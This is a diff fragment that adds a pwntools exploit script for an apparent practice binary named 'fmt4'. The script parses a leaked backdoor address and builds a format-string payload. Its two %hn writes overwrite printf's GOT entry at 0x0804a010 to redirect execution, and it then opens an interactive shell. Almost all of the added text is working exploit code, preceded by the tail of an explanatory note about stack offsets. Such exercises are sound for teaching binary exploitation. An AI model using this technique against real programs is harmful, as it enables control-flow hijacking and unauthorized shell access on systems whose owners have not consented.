@@ -117,3 +117,70 @@
  'correspond accurately to their positions on the stack, which may vary '
  'depending on the environment. If the offsets are incorrect, you might need '
  'to adjust the `offset` variable used in the format string.')
+
+from pwn import *
+
+# Set the logging level to 'debug' for detailed output (optional)
+context.log_level = 'debug'
+
+# Start the process
+io = process('./fmt4')
+
+# Read the line containing the 'gift' address and extract the backdoor address
+line = io.recvline()
+print(line.decode())
+
+# Extract the address of 'backdoor' from the 'gift' line
+backdoor_line = line.decode()
+address_str = backdoor_line.strip().split(' ')[1]
+backdoor_addr = int(address_str, 16)
+print(f"Backdoor address: {hex(backdoor_addr)}")
+
+# Address of 'printf' in the GOT
+printf_got = 0x0804a010  # From the provided GOT information
+
+# Split the 'backdoor' address into lower and higher 2 bytes
+backdoor_addr_low = backdoor_addr & 0xffff
+backdoor_addr_high = (backdoor_addr >> 16) & 0xffff
+
+# Decide the order of writing to avoid negative padding
+if backdoor_addr_low > backdoor_addr_high:
+    first_value = backdoor_addr_high
+    second_value = backdoor_addr_low
+    first_addr = printf_got + 2
+    second_addr = printf_got
+else:
+    first_value = backdoor_addr_low
+    second_value = backdoor_addr_high
+    first_addr = printf_got
+    second_addr = printf_got + 2
+
+# Create the payload with addresses
+payload = p32(first_addr)
+payload += p32(second_addr)
+
+# Calculate the padding needed after considering the bytes already written
+offset = 9  # The offset where our addresses are located on the stack
+written = len(payload)  # Bytes already written
+
+# Calculate padding for the first write
+padding1 = (first_value - written) % 0x10000
+if padding1 < 10:
+    padding1 += 0x10000  # Ensure sufficient padding to prevent format string issues
+written += padding1  # Update the total bytes written
+
+# Calculate padding for the second write
+padding2 = (second_value - written) % 0x10000
+if padding2 < 10:
+    padding2 += 0x10000  # Ensure sufficient padding
+written += padding2  # Update total bytes written
+
+# Construct the format string to write the values to the calculated addresses
+payload += f'%{padding1}c%{offset}$hn'.encode()
+payload += f'%{padding2}c%{offset + 1}$hn'.encode()
+
+# Send the payload to the process
+io.sendline(payload)
+
+# Interact with the spawned shell
+io.interactive()
